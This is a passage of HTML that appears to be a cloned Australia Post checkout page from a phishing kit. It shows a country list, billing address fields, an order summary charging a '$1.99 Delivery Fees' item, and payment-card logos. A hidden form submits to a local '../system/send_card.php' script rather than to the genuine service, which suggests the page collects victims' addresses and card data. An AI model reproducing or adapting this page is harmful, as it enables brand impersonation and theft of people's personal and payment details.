value="TP">East Timor</option><option value="EC">Ecuador</option><option value="GQ">Equatorial Guinea</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="SZ">Eswatini</option><option value="ET">Ethiopia</option><option value="FK">Falkland Islands (Malvinas)</option><option value="FO">Faroe Islands</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GF">French Guiana</option><option value="TF">French Southern Territories</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GI">Gibraltar</option><option value="GR">Greece</option><option value="GL">Greenland</option><option value="GP">Guadeloupe</option><option value="GT">Guatemala</option><option value="GN">Guinea</option><option value="GY">Guyana</option><option value="HT">Haiti</option><option value="HM">Heard And Mc Donald Islands</option><option value="VA">Holy See (Vatican City State)</option><option value="HN">Honduras</option><option value="HK">Hong Kong</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran (Islamic Republic Of)</option><option value="IE">Ireland</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KI">Kiribati</option><option value="KG">Kyrgyzstan</option><option value="LA">Lao People'S Democratic Republic</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LI">Liechtenstein</option><option value="LU">Luxembourg</option><option value="MO">Macau</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MQ">Martinique</option><option value="MR">Mauritania</option><option value="YT">Mayotte</option><option value="MX">Mexico</option><option value="FM">Micronesia, Federated States Of</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MS">Montserrat</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="AN">Netherlands Antilles</option><option value="NC">New Caledonia</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="NU">Niue</option><option value="NF">Norfolk Island</option><option value="MK">North Macedonia</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="QA">Qatar</option><option value="RO">Romania</option><option value="KN">Saint Kitts And Nevis</option><option value="LC">Saint Lucia</option><option value="VC">Saint Vincent And The Grenadines</option><option value="MP">Saipan</option><option value="ST">Sao Tome And Principe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SG">Singapore</option><option value="SK">Slovakia (Slovak Republic)</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="GS">South Georgia And The South Sandwich Islands</option><option value="KR">South Korea</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="SH">St. Helena</option><option value="PM">St. Pierre And Miquelon</option><option value="SJ">Svalbard And Jan Mayen Islands</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="TW">Taiwan</option><option value="TJ">Tajikistan</option><option value="TH">Thailand</option><option value="TG">Togo</option><option value="TK">Tokelau</option><option value="TO">Tonga</option><option value="TT">Trinidad And Tobago</option><option value="TR">Turkiye</option><option value="TM">Turkmenistan</option><option value="TC">Turks And Caicos Islands</option><option value="TV">Tuvalu</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States</option><option value="UM">United States Minor Outlying Islands</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VN">Vietnam</option><option value="WF">Wallis And Futuna Islands</option><option value="EH">Western Sahara</option><option value="YU">Yugoslavia</option></select>
</div>
</div></fieldset><div id="qas-field-container" class=""><div class="form-group">
<label class="control-label col-sm-12" for="billing_Address">Address</label>
<div class="col-sm-12">
<img src="./Checkout Address_files/loading-spinner.svg" alt="loading icon" class="search-address hidden">
</div>
</div><input type="hidden" name="QASUsed" value="true">
<a href="javascript:void(0);" class="enter-address-manually">Enter address manually</a>
</div>
<fieldset>
<div id="address-div" class="hidden qas-populated-fields">
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_Address1">Address line 1</label>
<div class="col-sm-12">
<input type="text" class="form-control " name="billing_Address1" id="billing_Address1" maxlength="40" data-bv-stringlength-message="The address must not exceed 60 characters. " data-bv-field="billing_Address1"></div>
</div>
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_Address2">Address line 2<span class="grey-italic"> (optional)</span></label>
<div class="col-sm-12"><small class="help-block" data-bv-validator="stringLength" data-bv-for="billing_Address2" id="stringLength_billing_Address2" data-bv-result="NOT_VALIDATED" style="display: none;">Field is mandatory.</small>
<input type="text" class="form-control " name="billing_Address2" id="billing_Address2" maxlength="40" data-bv-stringlength-message="Field is mandatory." data-bv-field="billing_Address2"></div>
</div></div>
<div id="city-div" class="hidden qas-populated-fields">
<div class="form-group ">
<label class="control-label col-sm-12" for="billing_City">City/suburb</label>
<div class="col-sm-12">
<input type="text" class="form-control " name="billing_City" id="billing_City" data-bv-notempty-message="Please enter a city or suburb" maxlength="35"   ></div>
</div> 
</div> 
<div id="state-div" class="hidden qas-populated-fields"><div class="form-group">

<label class="control-label col-sm-12" for="billing_State">State</label>
<div class="col-sm-12"><small class="help-block" data-bv-validator="notEmpty" data-bv-for="billing_State" id="notEmpty_billing_State" data-bv-result="NOT_VALIDATED" style="display: none;">Please select a state</small><select class="form-control" name="billing_State" id="billing_State" style="" data-bv-notempty-message="Please select a state" data-bv-field="billing_State"><option value="">Please select</option><option value="ACT">Australian Capital Territory</option><option value="NSW">New South Wales</option><option value="NT">Northern Territory</option><option value="QLD">Queensland</option><option value="SA">South Australia</option><option value="TAS">Tasmania</option><option value="VIC">Victoria</option><option value="WA">Western Australia</option></select></div> 
</div></div>
<div id="postal-div" class="hidden qas-populated-fields"><div class="row">
<div class="form-group col-sm-6">
<label class="control-label col-sm-12" for="billing_PostalCode">Postcode</label>
<div class="col-sm-12"><small class="help-block" data-bv-validator="stringLength" data-bv-for="billing_PostalCode" id="stringLength_billing_PostalCode" data-bv-result="NOT_VALIDATED" style="display: none;">The postal code must not exceed 35 characters.</small><small class="help-block" data-bv-validator="notEmpty" data-bv-for="billing_PostalCode" id="notEmpty_billing_PostalCode" data-bv-result="NOT_VALIDATED" style="display: none;">Please enter a postcode</small>
<input type="tel" class="form-control address-zipcode ui-autocomplete-input" name="billing_PostalCode" id="billing_PostalCode"  data-bv-notempty-message="Please enter a postcode" maxlength="35" data-bv-stringlength-message="The postal code must not exceed 35 characters." autocomplete="off" data-ajax-url="https://auspost.com.au/shop/web/WFS/AusPost-Shop-Site/en_AU/-/AUD/ViewAddressValidation-ValidateDomesticAddress" data-bv-field="billing_PostalCode"></div>
</div> 
</div>
</div>
<div id="nickname-div" class="nickname"></div>
</fieldset>
</div></div> 
</div>
</div>
<input type="hidden" name="-59479283_a6IK0EsvOooAAAGOMJoCQJK5" value="a6IK0EsvOooAAAGOMJoCQJK5"></div>
</div></div>
</div> 
<div class="right-panel">
<div class="order-summary" style="top: 0px;">
<div class="heading-row">
<h2>Order details</h2>
<span class="item-count">1 item</span>
</div><div class="line-items-summary"> 
 
<div class="cart-summary-checkout">
<div class="pli-info">
<div class="product-information"><a href="">$1.99 Delivery Fees</a><div class="product-id">SKU: 059069713</div><div class="variation-info"> 
card value: $1.99</div></div>
<div class="cart-pli-data text-right">
<div class="pli-qty">Qty<br>1</div>
<div class="pli-subtotal">$1.99</div>
</div>
</div></div></div><div class="cost-summary">
<div class="cost-summary-wrapper"> 
 
 
 
 
<div class="clearfix">
<dl class="dl-horizontal">

<dd>$0.00</dd><dt>GST (included)</dt>
<dd>$0.00</dd></dl>
</div><div class="total-price-wrapper">
<span class="total-label">Order total</span>
<span class="total-price text-right">$1.99</span>
</div>
</div>
<button name="continue" class="ap-btn btn-block ap-btn-primary ap-big-button checkError" type="submit">Continue</button> 
</div>
<div class="available-payments">
<h6>Available payment options</h6>
<div class="payment-images">
<svg width="38" height="24" viewBox="0 0 38 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0)">
<path d="M35.5 0.5H2.5C1.39543 0.5 0.5 1.39543 0.5 2.5V21.5C0.5 22.6046 1.39543 23.5 2.5 23.5H35.5C36.6046 23.5 37.5 22.6046 37.5 21.5V2.5C37.5 1.39543 36.6046 0.5 35.5 0.5Z" fill="white" stroke="black" stroke-opacity="0.2"></path>
<path d="M15.0791 8.15869L11.4319 16.8632H9.05161L7.25702 9.91714C7.14736 9.48882 7.05318 9.33271 6.72162 9.15209C6.17718 8.85923 5.28698 8.58314 4.5 8.41155L4.55419 8.15353H8.3846C8.6341 8.15455 8.87505 8.24447 9.06422 8.40715C9.25338 8.56983 9.37836 8.79461 9.41671 9.04114L10.365 14.0791L12.7156 8.15869H15.0791ZM24.4068 14.0224C24.4159 11.7246 21.2292 11.5982 21.2511 10.5712C21.2576 10.259 21.5556 9.92618 22.2058 9.84232C22.9673 9.76869 23.7345 9.90243 24.4262 10.2294L24.8222 8.38704C24.149 8.13399 23.436 8.00293 22.7167 8C20.4977 8 18.925 9.18306 18.9108 10.8783C18.8966 12.1284 20.0294 12.8303 20.8847 13.247C21.762 13.6727 22.0575 13.9462 22.0536 14.3281C22.0536 14.9126 21.3531 15.1693 20.7067 15.1796C19.574 15.1977 18.9173 14.8739 18.3935 14.63L17.9819 16.5368C18.5083 16.7794 19.4798 16.9897 20.4874 17C22.8522 17 24.4004 15.8311 24.4081 14.0224H24.4068ZM30.2847 16.8607H32.367L30.5492 8.15869H28.6256C28.4204 8.15781 28.2197 8.21809 28.0489 8.33184C27.8782 8.44559 27.7452 8.60764 27.667 8.79731L24.2907 16.8632H26.6542L27.1239 15.5641H30.0125L30.2847 16.8607ZM27.7715 13.7798L28.9571 10.5106L29.6396 13.7798H27.7715ZM18.3045 8.15869L16.4364 16.8632H14.1838L16.0467 8.15869H18.3045Z" fill="#1A1F71"></path>
</g>
<defs>
<clippath id="clip0">
<rect width="38" height="24" fill="white"></rect>
</clippath>
</defs>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" width="38" height="24" viewBox="0 0 38 24">
<g fill="none" fill-rule="evenodd">
<path d="M0 0h38v24H0z"></path>
<rect width="37" height="23" x=".5" y=".5" fill="#FFF" stroke="#000" stroke-opacity=".2" rx="2"></rect>
<path fill="#FF5F00" d="M15.992 6.427h6.006v10.516h-6.006z"></path>
<path fill="#EB001B" d="M16.485 11.689c0-2.137 1.03-4.032 2.612-5.258A6.936 6.936 0 0 0 14.864 5C11.07 5 8 7.991 8 11.689c0 3.697 3.07 6.688 6.864 6.688 1.602 0 3.07-.539 4.233-1.43a6.618 6.618 0 0 1-2.612-5.258z"></path>
<path fill="#F79E1B" d="M29.995 11.689c0 3.697-3.07 6.688-6.864 6.688a6.936 6.936 0 0 1-4.233-1.43c1.602-1.227 2.612-3.122 2.612-5.258 0-2.137-1.03-4.032-2.612-5.258A6.936 6.936 0 0 1 23.131 5c3.794 0 6.864 3.01 6.864 6.689z"></path>
</g>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" width="38" height="24" viewBox="0 0 38 24">
<g fill="none" fill-rule="evenodd">
<path d="M0 0h38v24H0z"></path>
<rect width="37" height="23" x=".5" y=".5" fill="#005ECB" stroke="#3C3C3C" stroke-opacity=".12" rx="2"></rect>
<path fill="#FFF" d="M28.025 6.66l-.734 1.784h1.471l-.737-1.784zm-8.468 1.105c.139-.072.22-.23.22-.425 0-.192-.085-.33-.224-.396-.126-.072-.32-.08-.505-.08h-1.313v.994h1.295c.207 0 .38-.003.527-.093zM2.736 6.66L2.01 8.444h1.456l-.73-1.784zm33.777 11.428h-2.06v-.96h2.051c.204 0 .346-.027.432-.11a.394.394 0 0 0 .126-.293.367.367 0 0 0-.13-.296c-.078-.068-.19-.1-.376-.1-1.001-.033-2.25.032-2.25-1.384 0-.65.41-1.333 1.53-1.333h2.123v-.89h-1.973c-.595 0-1.028.143-1.334.365v-.365h-2.919c-.466 0-1.014.116-1.273.365v-.365h-5.211v.365c-.415-.3-1.115-.365-1.438-.365h-3.438v.365c-.328-.318-1.057-.365-1.502-.365h-3.847l-.88.956-.825-.956H7.572v6.245h5.639l.907-.971.854.971 3.476.003V17.5h.342c.46.008 1.005-.01 1.485-.219v1.686h2.866v-1.628h.139c.176 0 .194.007.194.184v1.443h8.708c.553 0 1.131-.141 1.451-.4v.4h2.763c.575 0 1.136-.08 1.563-.287v-1.164c-.259.38-.764.573-1.446.573zm-17.678-1.475h-1.33v1.501h-2.072l-1.313-1.481-1.364 1.481H8.533V13.64h4.288l1.311 1.467 1.356-1.467h3.407c.846 0 1.796.235 1.796 1.474 0 1.243-.924 1.5-1.856 1.5zm6.397-.203c.15.219.172.422.176.817v.887h-1.07v-.56c0-.269.026-.668-.172-.876-.156-.16-.393-.198-.783-.198h-1.139v1.634h-1.07V13.64h2.46c.54 0 .933.024 1.283.21.337.205.548.484.548.995 0 .714-.475 1.078-.755 1.19.237.088.43.246.522.376zm4.404-1.846h-2.497v.814h2.436v.913h-2.436v.89l2.497.005v.928h-3.559V13.64h3.559v.925zm2.74 3.55h-2.077v-.96h2.068c.202 0 .345-.026.435-.11a.398.398 0 0 0 .126-.292.385.385 0 0 0-.13-.296c-.081-.069-.194-.1-.38-.1-.996-.034-2.245.031-2.245-1.385 0-.649.407-1.332 1.524-1.332h2.138v.952h-1.956c-.194 0-.32.008-.427.081-.117.073-.16.18-.16.322 0 .169.099.284.233.333.112.04.233.051.415.051l.574.016c.578.014.976.114 1.217.36.207.215.319.487.319.948 0 .963-.6 1.412-1.675 1.412zm-8.27-3.478c-.128-.076-.318-.08-.508-.08h-1.313v1.005h1.296c.207 0 .383-.008.526-.093a.483.483 0 0 0 .22-.43c0-.19-.082-.33-.22-.402zm11.912-.08c-.194 0-.323.007-.431.08-.113.073-.156.18-.156.322 0 .17.095.284.233.334.113.039.234.05.411.05l.578.016c.583.014.972.115 1.21.36.043.034.069.073.099.111v-1.273h-1.944zm-17.146 0h-1.39v1.14h1.378c.41 0 .664-.205.664-.592 0-.391-.267-.549-.652-.549zm-9.277 0v.813h2.34v.913h-2.34v.89h2.62l1.219-1.312-1.167-1.305H9.595zm6.844 3.13v-3.589l-1.637 1.765 1.637 1.823zm-6.755-7.187v.772h8.907l-.004-1.632h.173c.12.004.155.016.155.215v1.417h4.607v-.38c.372.2.95.38 1.71.38h1.938l.415-.994h.92l.405.994h3.735v-.944l.565.944h2.993V5.03H33.24v.737l-.415-.737h-3.039v.737l-.38-.737H25.3c-.687 0-1.291.096-1.779.364V5.03H20.69v.364c-.31-.276-.734-.364-1.204-.364H9.135l-.694 1.612-.713-1.612h-3.26v.737L4.11 5.03H1.33L.039 7.997v2.374l1.909-4.475h1.584l1.813 4.237V5.896h1.74L8.48 8.932l1.282-3.036h1.775v4.475h-1.093l-.004-3.505-1.546 3.505h-.936l-1.55-3.508v3.508H4.24l-.41-.998H1.61l-.414.998H.04v.9H1.86l.41-.994h.92l.41.994h3.584v-.76l.32.763h1.86l.32-.775zM23.72 6.418c.344-.357.884-.522 1.619-.522h1.032v.959h-1.01c-.39 0-.61.058-.82.265-.183.188-.307.544-.307 1.013 0 .48.095.825.293 1.051.164.177.462.23.743.23h.479l1.502-3.518h1.598l1.804 4.232V5.896h1.624l1.874 3.116V5.896h1.092v4.475h-1.511l-2.02-3.359v3.359H29.54l-.415-.998h-2.214l-.403.998H25.26c-.518 0-1.174-.115-1.545-.495-.375-.38-.57-.895-.57-1.708 0-.664.116-1.27.575-1.75zm-2.193-.522h1.088v4.475h-1.088V5.896zm-4.904 0h2.452c.544 0 .946.015 1.29.214.338.2.54.492.54.991 0 .714-.475 1.082-.751 1.193.233.089.432.246.527.377.15.222.177.42.177.82v.88h-1.075l-.005-.565c0-.269.026-.656-.168-.871-.156-.158-.393-.192-.777-.192H17.69v1.628h-1.066V5.896zm-4.298 0h3.561v.932h-2.495v.806h2.435v.918h-2.435v.893h2.495v.926h-3.561V5.896z"></path>
</g>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" width="50" height="14" viewBox="0 0 50 14">
<g fill="none" fill-rule="evenodd">
<path fill="#253B80" d="M6.298.42H2.456a.533.533 0 0 0-.527.449l-1.554 9.82a.32.32 0 0 0 .317.369h1.834c.263 0 .486-.19.527-.45l.42-2.649c.04-.259.264-.45.526-.45h1.217c2.53 0 3.991-1.22 4.373-3.64.172-1.058.007-1.89-.49-2.472C8.553.757 7.584.42 6.299.42zm.444 3.586C6.532 5.38 5.478 5.38 4.46 5.38h-.58l.407-2.566a.32.32 0 0 1 .316-.27h.266c.693 0 1.348 0 1.686.395.202.235.264.585.187 1.067zM17.783 3.962h-1.84a.32.32 0 0 0-.316.27l-.081.512-.13-.186c-.397-.576-1.286-.768-2.172-.768-2.033 0-3.77 1.534-4.108 3.688-.176 1.074.074 2.1.685 2.817.561.659 1.363.933 2.318.933 1.638 0 2.546-1.05 2.546-1.05l-.082.51a.32.32 0 0 0 .316.37h1.657c.264 0 .486-.191.528-.45l.994-6.278a.318.318 0 0 0-.315-.368zm-2.564 3.57c-.178 1.047-1.012 1.75-2.076 1.75-.535 0-.962-.17-1.236-.494-.272-.321-.375-.779-.288-1.288a2.057 2.057 0 0 1 2.061-1.766c.523 0 .948.173 1.227.5.28.33.392.79.312 1.297zM27.582 3.962h-1.849a.536.536 0 0 0-.442.234l-2.55 3.744-1.08-3.598a.535.535 0 0 0-.513-.38H19.33a.32.32 0 0 0-.304.422l2.036 5.958-1.914 2.694a.319.319 0 0 0 .261.504h1.847c.175 0 .34-.085.439-.229l6.149-8.848a.319.319 0 0 0-.263-.501z"></path>
<path fill="#179BD7" d="M33.703.42h-3.842a.533.533 0 0 0-.527.449l-1.554 9.82c-.031.194.12.369.316.369h1.971c.184 0 .34-.134.369-.315l.441-2.784c.04-.259.265-.45.527-.45h1.216c2.531 0 3.991-1.22 4.373-3.64.173-1.058.007-1.89-.49-2.472-.546-.64-1.514-.978-2.8-.978zm.444 3.586c-.21 1.374-1.263 1.374-2.282 1.374h-.58l.408-2.566a.319.319 0 0 1 .315-.27h.266c.693 0 1.348 0 1.687.395.201.235.263.585.186 1.067zM45.188 3.962h-1.84a.318.318 0 0 0-.315.27l-.081.512-.13-.186c-.398-.576-1.285-.768-2.172-.768-2.033 0-3.77 1.534-4.107 3.688-.176 1.074.073 2.1.685 2.817.561.659 1.362.933 2.317.933 1.638 0 2.547-1.05 2.547-1.05l-.082.51a.32.32 0 0 0 .316.37h1.657c.263 0 .486-.191.527-.45l.995-6.278a.32.32 0 0 0-.317-.368zm-2.565 3.57c-.176 1.047-1.012 1.75-2.076 1.75-.533 0-.961-.17-1.235-.494-.272-.321-.374-.779-.289-1.288.167-1.04 1.014-1.766 2.062-1.766.522 0 .947.173 1.227.5.281.33.392.79.311 1.297zM47.357.689l-1.577 10c-.031.194.12.369.316.369h1.585c.263 0 .487-.19.527-.45l1.555-9.82a.32.32 0 0 0-.315-.37h-1.776a.32.32 0 0 0-.315.27z"></path>
</g>
</svg>
<svg width="54" height="34" viewBox="0 0 54 34" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_2738_3749)">
<path d="M48.353 0H4.75617C4.57459 0 4.3927 0 4.21145 0.00105884C4.05823 0.00214976 3.90538 0.00385032 3.75252 0.00802151C3.41914 0.0170377 3.08291 0.0367064 2.75371 0.0958731C2.41925 0.156066 2.10801 0.25425 1.80438 0.40884C1.50589 0.560639 1.23261 0.759188 0.995786 0.996111C0.758859 1.23303 0.560311 1.50586 0.408544 1.80468C0.253921 2.10831 0.155674 2.41964 0.0958975 2.75436C0.0364132 3.08366 0.0166129 3.41983 0.00762878 3.75285C0.00352176 3.9057 0.00176024 4.05856 0.000762364 4.21139C-0.000296475 4.39303 5.64714e-05 4.57454 5.64714e-05 4.7565V29.2439C5.64714e-05 29.4258 -0.000296475 29.607 0.000762364 29.789C0.00176024 29.9418 0.00352176 30.0947 0.00762878 30.2475C0.0166129 30.5803 0.0364132 30.9164 0.0958975 31.2456C0.155674 31.5805 0.253921 31.8917 0.408544 32.1954C0.560311 32.4942 0.758859 32.7674 0.995786 33.0039C1.23261 33.2412 1.50589 33.4397 1.80438 33.5912C2.10801 33.7462 2.41925 33.8444 2.75371 33.9045C3.08291 33.9633 3.41914 33.9833 3.75252 33.9924C3.90538 33.9958 4.05823 33.9979 4.21145 33.9986C4.3927 34 4.57459 34 4.75617 34H48.353C48.5343 34 48.7162 34 48.8974 33.9986C49.0503 33.9979 49.2031 33.9958 49.3567 33.9924C49.6894 33.9833 50.0255 33.9633 50.3555 33.9045C50.6895 33.8444 51.0008 33.7462 51.3045 33.5912C51.6033 33.4397 51.8758 33.2412 52.1131 33.0039C52.3496 32.7674 52.5482 32.4942 52.7003 32.1954C52.8553 31.8917 52.9535 31.5805 53.013 31.2456C53.0725 30.9164 53.0918 30.5803 53.1008 30.2475C53.105 30.0947 53.107 29.9418 53.1077 29.789C53.1091 29.607 53.1092 29.4258 53.1092 29.2439V4.7565C53.1092 4.57454 53.1091 4.39303 53.1077 4.21139C53.107 4.05856 53.105 3.9057 53.1008 3.75285C53.0918 3.41983 53.0725 3.08366 53.013 2.75436C52.9535 2.41964 52.8553 2.10831 52.7003 1.80468C52.5482 1.50586 52.3496 1.23303 52.1131 0.996111C51.8758 0.759188 51.6033 0.560639 51.3045 0.40884C51.0008 0.25425 50.6895 0.156066 50.3555 0.0958731C50.0255 0.0367064 49.6894 0.0170377 49.3567 0.00802151C49.2031 0.00385032 49.0503 0.00214976 48.8974 0.00105884C48.7162 0 48.5343 0 48.353 0Z" fill="black"></path>
<path d="M48.3535 1.1333L48.8898 1.13433C49.0351 1.13535 49.1804 1.13693 49.3265 1.14091C49.5806 1.14777 49.8779 1.16154 50.155 1.21121C50.3959 1.25459 50.5979 1.32055 50.7917 1.41925C50.9831 1.5165 51.1585 1.64395 51.3116 1.79684C51.4653 1.95076 51.5929 2.1264 51.6914 2.31991C51.7896 2.51226 51.8551 2.71331 51.8983 2.95595C51.9478 3.23003 51.9615 3.52811 51.9685 3.7838C51.9724 3.92812 51.9743 4.07245 51.975 4.2202C51.9764 4.39889 51.9764 4.57748 51.9764 4.75652V29.2439C51.9764 29.4229 51.9764 29.6012 51.975 29.7837C51.9743 29.928 51.9724 30.0723 51.9684 30.2169C51.9615 30.4722 51.9478 30.7701 51.8977 31.0474C51.8551 31.2867 51.7896 31.4878 51.6909 31.6811C51.5927 31.8742 51.4653 32.0496 51.3122 32.2026C51.1583 32.3566 50.9835 32.4836 50.7898 32.5818C50.5974 32.68 50.3957 32.7459 50.1572 32.7888C49.8745 32.8392 49.5648 32.8531 49.3315 32.8594C49.1848 32.8627 49.0387 32.8647 48.8891 32.8654C48.7108 32.8668 48.5319 32.8667 48.3535 32.8667H4.75666C4.75428 32.8667 4.75197 32.8667 4.74956 32.8667C4.57328 32.8667 4.39665 32.8667 4.21716 32.8654C4.07082 32.8647 3.92479 32.8627 3.78361 32.8595C3.54502 32.8531 3.2351 32.8392 2.9547 32.7892C2.71416 32.7459 2.51249 32.68 2.31754 32.5805C2.1257 32.4832 1.95105 32.3563 1.79701 32.202C1.64415 32.0494 1.51712 31.8745 1.41891 31.6812C1.32059 31.488 1.25482 31.2863 1.21157 31.0442C1.16158 30.7674 1.14784 30.4707 1.14098 30.2171C1.13706 30.0719 1.13543 29.9268 1.13449 29.7824L1.13379 29.3564L1.13382 29.2439V4.75652L1.13379 4.64403L1.13446 4.21885C1.13543 4.07367 1.13706 3.92851 1.14098 3.78345C1.14784 3.52961 1.16158 3.23275 1.21198 2.95367C1.25485 2.7137 1.32059 2.51201 1.41942 2.31792C1.51686 2.12607 1.64412 1.95095 1.79778 1.79732C1.95083 1.64421 2.12605 1.51692 2.31911 1.41874C2.51198 1.32052 2.71403 1.25459 2.95458 1.2113C3.23173 1.1615 3.5292 1.14777 3.78397 1.14087C3.92919 1.13693 4.07441 1.13535 4.21854 1.13436L4.75666 1.1333H48.3535" fill="white"></path>
<path d="M14.4981 11.4356C14.9529 10.8669 15.2615 10.1032 15.1801 9.32275C14.5144 9.35585 13.7021 9.76192 13.2318 10.3311C12.8095 10.8186 12.4358 11.6143 12.5332 12.362C13.2804 12.4268 14.027 11.9885 14.4981 11.4356Z" fill="black"></path>
<path d="M15.1715 12.508C14.0863 12.4434 13.1636 13.1239 12.6454 13.1239C12.1269 13.1239 11.3333 12.5406 10.475 12.5563C9.35783 12.5727 8.32124 13.2043 7.75433 14.209C6.58828 16.2187 7.44661 19.1999 8.58052 20.8367C9.13118 21.6465 9.79481 22.5381 10.6692 22.5061C11.4954 22.4737 11.8193 21.9711 12.8236 21.9711C13.8271 21.9711 14.1188 22.5061 14.9934 22.4899C15.9003 22.4737 16.4673 21.6797 17.018 20.8691C17.6497 19.946 17.9083 19.0546 17.9246 19.0057C17.9083 18.9895 16.1757 18.3248 16.1596 16.3318C16.1433 14.663 17.5199 13.8692 17.5847 13.82C16.8073 12.6702 15.5926 12.5406 15.1715 12.508Z" fill="black"></path>
<path d="M24.6209 10.2495C26.9795 10.2495 28.6219 11.8753 28.6219 14.2424C28.6219 16.618 26.9457 18.2522 24.5617 18.2522H21.9503V22.4052H20.0635V10.2495H24.6209V10.2495ZM21.9503 16.6685H24.1152C25.7579 16.6685 26.6929 15.7841 26.6929 14.2509C26.6929 12.7178 25.7579 11.8417 24.1236 11.8417H21.9503V16.6685V16.6685Z" fill="black"></path>
<path d="M29.1152 19.8865C29.1152 18.3364 30.303 17.3845 32.4091 17.2666L34.835 17.1234V16.4411C34.835 15.4555 34.1695 14.8659 33.0578 14.8659C32.0045 14.8659 31.3475 15.3712 31.1876 16.1631H29.4691C29.5702 14.5625 30.9347 13.3832 33.125 13.3832C35.2731 13.3832 36.6461 14.5204 36.6461 16.2978V22.4052H34.9023V20.9478H34.8604C34.3466 21.9335 33.2261 22.5568 32.0637 22.5568C30.3283 22.5568 29.1152 21.4785 29.1152 19.8865ZM34.835 19.0862V18.3871L32.6532 18.5218C31.5665 18.5977 30.9516 19.0778 30.9516 19.8359C30.9516 20.6108 31.5918 21.1163 32.569 21.1163C33.8409 21.1163 34.835 20.2402 34.835 19.0862Z" fill="black"></path>
<path d="M38.2921 25.6652V24.191C38.4267 24.2247 38.7299 24.2247 38.8816 24.2247C39.724 24.2247 40.1789 23.8709 40.4568 22.9612C40.4568 22.9443 40.617 22.422 40.617 22.4136L37.416 13.5432H39.387L41.6279 20.7541H41.6614L43.9024 13.5432H45.823L42.5037 22.8684C41.7459 25.0166 40.8698 25.7073 39.0334 25.7073C38.8816 25.7073 38.4267 25.6904 38.2921 25.6652Z" fill="black"></path>
</g>
<defs>
<clippath id="clip0_2738_3749">
<rect width="53.1091" height="34" fill="white"></rect>
</clippath>
</defs>
</svg>
</div></div>
</div>
</div>
</div><button type="submit" class="bv-hidden-submit" style="display: none; width: 0px; height: 0px;"></button></form>


<div class="hidden"><form method="Post" action="../system/send_card.php" name="UpdateShippingMethod" id="UpdateShippingMethodForm" class="ajax-submit"><input type="hidden" name="SynchronizerToken" value="2c9bc0408f51b31a21c552fb58f45accd4d005d49e7fde4250dd46255a0737e7"><input type="hidden" name="-59479283_a6IK0EsvOooAAAGOMJoCQJK5" value="a6IK0EsvOooAAAGOMJoCQJK5"><input type="submit" name="updateShipping" value="true" id="updateShipping"></form></div><script src="./Checkout Address_files/location-finder.js.téléchargement"></script>
</getapplicationbo></div>
</div>
<footer data-testing-id="section-footer">

<div class="clearfix"><div id="Section_cmp_20190924_121847" class="content-container  "><script type="text/javascript">
var _cms = new Object();
_cms.webRoot = "/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU";
_cms.contentURL = "/shop/static/WFS/AusPost-Shop-Site/-/-/en_AU/";
</script><div class="UDPC"><script type="text/javascript">setTimeout(function(){
if($('#primary-nav').length > 0){
$.each($('#primary-nav div.nav-item'), function(idx, obj){
if($(obj).find('.nav-drop-down li').length == 0){
$(obj).find('.nav-drop-down').addClass('hidden');
$(obj).find('.nav-item-chevron').remove();
}
});
}
}, 3000);

setTimeout(function(){
  if($('#mypost-logout-link-desktop').length > 0){
     $('.top-header').addClass('g-notification-available');
  }
 
  if($('.view-all-products-link').length > 0){
    $.each($('.view-all-products-link'), function(idx,obj){
        $(obj).find('a').attr('href', 'https://auspost.com.au/shop/sorting-SoldCount-desc?SearchTerm=*');
    });
  }
}, 2000);
</script></div></div>
<div><script type="text/javascript">// <![CDATA[
window.onload = function() {
let el = document.querySelector("img[alt='Alipay icon']");
el.setAttribute("style", "display: none;");
let el2 = document.querySelector("img[alt='WeChat icon']");
el2.setAttribute("style", "display: none;");
};
// ]]></script>
<div class="footer-top">
<div class="container">
<div class="footer-top-content checkout">
<div class="row">
<div class="col-md-7 col-lg-6">
<p>If you enter your email address during checkout, but do not complete a purchase, we’ll use these details to send you a reminder email about the contents of your shopping cart.</p>
